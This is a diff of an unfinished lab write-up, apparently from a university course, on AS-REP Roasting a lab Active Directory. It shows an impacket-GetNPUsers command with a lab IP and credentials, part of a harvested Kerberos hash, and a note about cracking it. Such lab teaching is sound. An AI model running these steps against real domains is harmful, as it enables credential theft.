@@ -101,7 +101,7 @@ As first attempt, we ask the DomainController the list of all accounts that can 
     `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request`
      `-format john`
 
-	From the output (*shown below*), we copy the string referring to the desired account in a **`.txt` file**.
+	From the output, we copy the string referring to the desired account (*as shown below*) in a **`.txt` file**.
 	
 	   `$krb5asrep$DNSoperator@CYBERSEC.UNITS.IT:8690a5aa5b288a036a49126539f292ef$afe3e87aafc
 	    35690745c5dfeb1f459dcc1ed858f1f4755d3aefa12921c93dbc35b35c0fd6094be7390eab67e0c016f96
@@ -113,7 +113,7 @@ As first attempt, we ask the DomainController the list of all accounts that can 
 
  
  4. **Perform AS-Rep Roasting:**
- As said, we now 
+ As said, we will now try to crack the password used for encoding the response obtained 
 
  
  5. ff
@@ -129,9 +129,10 @@ As first attempt, we ask the DomainController the list of all accounts that can 
 
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEwODczMzkyNDIsLTE4MTk4MTUyOTIsMj
-cxNzM0NDQ2LDkwNzAzMjc4LDE3MzYzOTc5NzIsMTIxMjI0NDE0
-MywxNTY1ODAwMjg3LC0yOTI1NDM5MzQsLTE0NDczODgzNjAsLT
-IwOTc2Nzg4NjMsMTA5NjE4MDExNSwtMTgxNDU3MjkwOCwtMjEx
-MjAxMDU4OCwtNDcyODY5OTM3LC0xMjQ3NzA2OTExXX0=
+eyJoaXN0b3J5IjpbLTE3MTkxOTQwMSwtMTA4NzMzOTI0MiwtMT
+gxOTgxNTI5MiwyNzE3MzQ0NDYsOTA3MDMyNzgsMTczNjM5Nzk3
+MiwxMjEyMjQ0MTQzLDE1NjU4MDAyODcsLTI5MjU0MzkzNCwtMT
+Q0NzM4ODM2MCwtMjA5NzY3ODg2MywxMDk2MTgwMTE1LC0xODE0
+NTcyOTA4LC0yMTEyMDEwNTg4LC00NzI4Njk5MzcsLTEyNDc3MD
+Y5MTFdfQ==
 -->
